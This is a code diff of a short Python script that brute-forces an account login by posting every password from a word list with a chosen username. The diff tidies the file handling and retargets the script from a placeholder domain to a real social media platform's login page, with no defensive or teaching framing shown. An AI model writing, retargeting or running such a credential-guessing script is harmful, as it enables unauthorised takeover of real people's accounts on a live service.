@@ -1,9 +1,8 @@
 import requests
 
 def brute_force_login(username):
-    password_file = open("passlist.txt", "r")
-    passwords = password_file.readlines()
-    password_file.close()
+    with open("passlist.txt", "r") as password_file:
+        passwords = password_file.readlines()
 
     for password in passwords:
         password = password.strip()
@@ -11,7 +10,7 @@ def brute_force_login(username):
             "username": username,
             "password": password
         }
-        response = requests.post("https://example.com/login", data=login_data)
+        response = requests.post("https://www.tiktok.com/login/", data=login_data)
 
         if response.status_code == 200:
             print("Login successful!")
